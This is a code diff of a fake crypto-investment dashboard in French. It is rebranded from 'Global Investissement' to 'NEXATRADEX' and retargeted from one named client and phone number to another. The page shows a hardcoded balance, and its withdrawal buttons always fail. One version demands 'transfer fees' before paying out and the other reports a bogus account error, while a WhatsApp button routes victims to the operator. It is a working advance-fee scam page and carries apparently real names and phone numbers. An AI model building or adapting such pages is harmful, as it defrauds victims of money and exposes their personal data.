@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Investissement - Crypto Trading</title>
+    <title>Trading Investissement - Crypto Trading</title>
     <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
     <style>
         body {
@@ -261,14 +261,14 @@
 
     <header>
         <div class="logo">
-            <h1>Global Investissement</h1>
+            <h1>NEXATRADEX</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1.250.000 F CFA</span>
+                <span class="balance">Solde: 1 050 $</span>
                 <div class="account-info">
-                    <span id="user-name">CHEIKH FALL</span><br>
-                    <span id="user-phone">221 774 078 384</span>
+                    <span id="user-name">NGASI OSCAR</span><br>
+                    <span id="user-phone">243 971 227 800</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -297,7 +297,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via Airtel Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -330,17 +330,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "CHEIKH FALL";
-                const accountNumber = "221 774 078 384";
-                const balance = "1.250.000 F CFA";
+                const accountName = "Ngasi Oscar";
+                const accountNumber = "243 971 227 800";
+                const balance = "1 050 $";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Airtel Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Orange Money");
+                    setWithdrawalInfo("Airtel Money");
                 }
             });
 
@@ -352,10 +352,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Vous devez payer les frais de transfert des bénéfices pour recevoir vos bénéfices dans les 1 minute qui suivent, notez que cette étapes es la dernière.');
+                alert('Numero incorrect, veuillez entrer le numero enregistrer au serveur de paiement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur :  Frais de transfert des bénéfices néccéssaire.';
+                errorMessage.textContent = 'Erreur : Erreur de compte.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
